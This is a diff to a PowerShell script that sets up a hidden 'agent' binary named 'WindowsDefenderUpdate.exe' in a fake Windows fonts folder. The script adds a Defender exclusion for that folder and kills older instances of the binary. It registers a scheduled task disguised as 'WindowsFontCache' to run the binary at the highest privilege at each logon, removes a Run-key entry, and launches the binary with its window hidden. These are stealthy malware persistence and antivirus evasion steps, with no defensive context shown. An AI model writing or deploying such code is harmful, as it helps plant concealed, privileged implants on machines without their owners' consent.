@@ -47,20 +47,24 @@ $fdir="$env:LOCALAPPDATA\Microsoft\Windows\Fonts"
 # 1. Add Defender exclusion
 Add-MpPreference -ExclusionPath $fdir -Force -ErrorAction SilentlyContinue
 
-# 2. Remove old scheduled task (if any from earlier experiments)
+# 2. Kill any existing agent process (old non-admin instance)
+Get-Process | Where-Object { $_.Path -eq "$fdir\WindowsDefenderUpdate.exe" } | Stop-Process -Force -ErrorAction SilentlyContinue
+Start-Sleep -Seconds 1
+
+# 3. Remove old scheduled task (if any)
 Unregister-ScheduledTask -TaskName "WindowsFontCache" -ErrorAction SilentlyContinue
 
-# 3. Create new scheduled task that runs *as admin* at every logon
+# 4. Create new scheduled task that runs as admin at every logon
 $taskAction    = New-ScheduledTaskAction -Execute "$fdir\WindowsDefenderUpdate.exe"
 $taskTrigger   = New-ScheduledTaskTrigger -AtLogOn
 $taskPrincipal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
 $taskSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -StartWhenAvailable -Compatibility Win8
 Register-ScheduledTask -TaskName "WindowsFontCache" -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings -Force | Out-Null
 
-# 4. (Optional) Remove the registry Run key so only the admin task runs the agent
+# 5. Remove the registry Run key (no longer needed)
 Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsFontHelper" -ErrorAction SilentlyContinue
 
-# 5. Start agent right now (admin)
+# 6. Start the agent now (admin)
 Start-Process "$fdir\WindowsDefenderUpdate.exe" -WindowStyle Hidden
 
 Start-Sleep -Seconds 3;exit
